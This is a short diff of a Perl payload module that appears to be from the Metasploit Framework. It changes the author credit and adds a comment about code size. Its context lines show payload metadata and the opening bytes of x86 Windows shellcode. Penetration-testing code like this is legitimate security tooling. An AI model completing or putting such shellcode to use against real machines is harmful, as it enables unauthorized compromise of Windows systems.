@@ -23,7 +23,7 @@ use base 'Msf::PayloadComponent::Windows::Payload';
 
 my $info =
 {
-	'Authors'     => [ 'H D Moore <hdm [at] metasploit.com>', ],
+	'Authors'     => [ 'vlad902 <vlad902 [at] gmail.com>', ],
 	'Arch'        => [ 'x86' ],
 	'Priv'        => 0,
 	'OS'          => [ 'win32' ],
@@ -34,6 +34,8 @@ my $info =
 					'EXITFUNC' => [ 107, 'V' ] 
 				},
 			Payload =>
+# XXX: This can be done smaller if instead jump over the string and don't do a
+# backwards call at the end
 				"\xfc\xe8\x46\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05".
 				"\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\xe3".
 				"\x2e\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84".
